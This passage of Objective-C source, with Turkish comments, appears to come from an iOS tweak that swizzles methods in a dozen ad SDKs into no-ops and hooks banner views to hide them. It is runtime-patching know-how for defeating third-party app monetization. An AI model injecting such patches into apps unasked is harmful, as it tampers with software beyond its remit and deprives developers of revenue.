        swizzleClassToNop(@"GADInterstitialAd", @"loadWithAdUnitID:request:completionHandler:");
        swizzleToNop(@"GADRewardedAd", @"presentFromRootViewController:userDidEarnRewardHandler:");
        swizzleClassToNop(@"GADRewardedAd", @"loadWithAdUnitID:request:completionHandler:");
        swizzleToNop(@"GADBannerView", @"loadRequest:");
        swizzleToNop(@"GADRewardedInterstitialAd", @"presentFromRootViewController:userDidEarnRewardHandler:");
        swizzleClassToNop(@"GADRewardedInterstitialAd", @"loadWithAdUnitID:request:completionHandler:");

        // ===== APPLOVIN (MAX) =====
        swizzleToNop(@"MAInterstitialAd", @"showAd");
        swizzleToNop(@"MAInterstitialAd", @"showAdForPlacement:");
        swizzleToNop(@"MAInterstitialAd", @"loadAd");
        swizzleToNop(@"MARewardedAd", @"showAd");
        swizzleToNop(@"MARewardedAd", @"showAdForPlacement:");
        swizzleToNop(@"MARewardedAd", @"loadAd");
        swizzleToNop(@"MAAdView", @"loadAd");
        swizzleToNop(@"MAAdView", @"startAutoRefresh");
        swizzleToBoolFalse(@"MAInterstitialAd", @"isReady");
        swizzleToBoolFalse(@"MARewardedAd", @"isReady");

        // ===== CLEVER ADS SOLUTIONS (CAS - ana mediation) =====
        swizzleToNop(@"CASMediationManager", @"presentInterstitialFromRootViewController:");
        swizzleToNop(@"CASMediationManager", @"presentRewardedAdFromRootViewController:");
        swizzleToNop(@"CASMediationManager", @"loadInterstitial");
        swizzleToNop(@"CASMediationManager", @"loadRewardedAd");
        swizzleToNop(@"CASBannerView", @"loadNextAd");
        swizzleToBoolFalse(@"CASMediationManager", @"isInterstitialReady");
        swizzleToBoolFalse(@"CASMediationManager", @"isRewardedAdReady");

        // ===== UNITY ADS =====
        swizzleClassToNop(@"UnityAds", @"show:placementId:showDelegate:");
        swizzleClassToNop(@"UnityAds", @"show:placementId:");
        swizzleClassToNop(@"UnityAds", @"load:loadDelegate:");
        swizzleToBoolFalse(@"UnityAds", @"isReady");
        swizzleClassToNop(@"UnityAds", @"initialize:testMode:initializationDelegate:");

        // ===== IRONSOURCE =====
        swizzleClassToNop(@"IronSource", @"showInterstitialWithViewController:");
        swizzleClassToNop(@"IronSource", @"showRewardedVideoWithViewController:");
        swizzleClassToNop(@"IronSource", @"loadInterstitial");
        swizzleToBoolFalse(@"IronSource", @"hasRewardedVideo");
        swizzleToBoolFalse(@"IronSource", @"hasInterstitial");
        swizzleClassToNop(@"ISAd", @"showWithViewController:");

        // ===== FACEBOOK AUDIENCE NETWORK =====
        swizzleToNop(@"FBInterstitialAd", @"showAdFromRootViewController:");
        swizzleToNop(@"FBInterstitialAd", @"loadAd");
        swizzleToNop(@"FBRewardedVideoAd", @"showAdFromRootViewController:");
        swizzleToNop(@"FBRewardedVideoAd", @"loadAd");
        swizzleToNop(@"FBAdView", @"loadAd");
        swizzleToBoolFalse(@"FBInterstitialAd", @"isAdValid");
        swizzleToBoolFalse(@"FBRewardedVideoAd", @"isAdValid");

        // ===== INMOBI =====
        swizzleToNop(@"IMInterstitial", @"show");
        swizzleToNop(@"IMInterstitial", @"load");
        swizzleToNop(@"IMBanner", @"load");
        swizzleToBoolFalse(@"IMInterstitial", @"isReady");

        // ===== VUNGLE =====
        swizzleClassToNop(@"VungleSDK", @"playAd:options:placementID:error:");
        swizzleToBoolFalse(@"VungleSDK", @"isAdCachedForPlacementID:");

        // ===== CHARTBOOST =====
        swizzleClassToNop(@"Chartboost", @"showInterstitial:");
        swizzleClassToNop(@"Chartboost", @"showRewardedVideo:");
        swizzleToBoolFalse(@"Chartboost", @"hasInterstitial:");
        swizzleToBoolFalse(@"Chartboost", @"hasRewardedVideo:");

        // ===== MINTEGRAL =====
        swizzleToNop(@"MTGInterstitialAdManager", @"showFromViewController:");
        swizzleToNop(@"MTGRewardAdManager", @"showVideo:delegate:");

        // ===== PANGLE (ByteDance) =====
        swizzleToNop(@"BUNativeExpressInterstitialAd", @"showAdFromRootViewController:");
        swizzleToNop(@"BURewardedVideoAd", @"showAdFromRootViewController:");

        // ===== YANDEX =====
        swizzleToNop(@"YMAInterstitialAd", @"show");
        swizzleToNop(@"YMARewardedAd", @"show");

        // ===== UIView TABANLI BANNER TEMIZLIGI =====
        // GADBannerView, MAAdView, FBAdView gibi banner'lari gomulunce otomatik gizle
        few1n_after(5.0, ^{
            // Banner siniflarinin instance'larini gizle (varsa)
            NSArray *bannerClasses = @[@"GADBannerView", @"MAAdView", @"FBAdView", @"IMBanner", @"CASBannerView"];
            for (NSString *clsName in bannerClasses) {
                Class cls = NSClassFromString(clsName);
                if (!cls) continue;
                // didMoveToWindow hook'u: banner ekrana eklenince gizle
                SEL sel = @selector(didMoveToWindow);
                Method m = class_getInstanceMethod(cls, sel);
                if (m) {
                    IMP origImp = method_getImplementation(m);
                    method_setImplementation(m, imp_implementationWithBlock(^(UIView* _self) {
                        if (origImp) ((void(*)(id, SEL))origImp)(_self, @selector(didMoveToWindow));
                        _self.hidden = YES;
                        _self.alpha = 0;
                        _self.frame = CGRectZero;
                    }));
                }
            }
            FLog(@"\U0001F6AB Banner gizleme hooklari kuruldu");
        });

        FLog(@"\U0001F6AB Reklam bozucu: tum SDK'lar engellendi (AdMob/AppLovin/CAS/Unity/IronSource/FB/InMobi/Vungle/Chartboost/Mintegral/Pangle/Yandex)");
    }

    few1n_after(3.0, ^{ few1n_poll(); });
}
